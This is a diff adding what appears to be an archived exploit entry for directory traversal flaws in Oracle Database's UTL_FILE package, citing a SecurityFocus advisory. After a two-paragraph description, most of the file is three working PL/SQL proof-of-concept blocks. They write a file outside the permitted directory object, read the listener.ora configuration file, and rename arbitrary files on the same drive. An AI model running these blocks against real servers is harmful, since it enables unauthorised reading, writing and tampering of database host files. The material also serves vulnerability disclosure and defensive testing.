@@ -1,0 +1,44 @@
+source: http://www.securityfocus.com/bid/12749/info
+
+Oracle Database server is reported prone to multiple directory traversal vulnerabilities that may allow a remote attacker to read, write, or rename arbitrary files with the privileges of the Oracle Database server.
+
+The issues are reported to exist due to a lack of sufficient input validation performed on filenames and paths passed to file processing functions, and may allow a malicious SQL query to traverse outside of a directory that is described in an Oracle directory object. 
+
+--this create a file called Unbreakable.txt in the
+same drive as the directory referenced by
+--MEDIA_DIR directory object.
+declare
+f utl_file.file_type;
+begin
+f:=UTL_FILE.FOPEN
+('MEDIA_DIR','\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\Unbreakable.txt','w',1000);
+UTL_FILE.PUT_LINE (f,'Sure',TRUE);
+UTL_FILE.FCLOSE(f);
+end;
+
+--this example can be used to read arbitrary files in
+the same drive as the directory referenced by
+--MEDIA_DIR directory object.
+SET SERVEROUTPUT ON
+declare
+f utl_file.file_type;
+sBuffer Varchar(8000);
+begin
+f:=UTL_FILE.FOPEN
+('MEDIA_DIR','\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\OracleDir\ora90\network\ADMIN\listener.ora','r');
+loop
+UTL_FILE.GET_LINE (f,sBuffer);
+DBMS_OUTPUT.PUT_LINE(sBuffer);
+end loop;
+EXCEPTION
+when no_data_found then
+UTL_FILE.FCLOSE(f);
+end;
+
+--this rename any file in the same drive as the
+directory referenced by
+--MEDIA_DIR directory object
+begin
+
+UTL_FILE.frename('MEDIA_DIR','\\.\\..\\.\\..\\.\\FileToRename','MEDIA_DIR','\\.\\..\\.\\..\\.\\Unbreakable.txt',TRUE);
+end; 
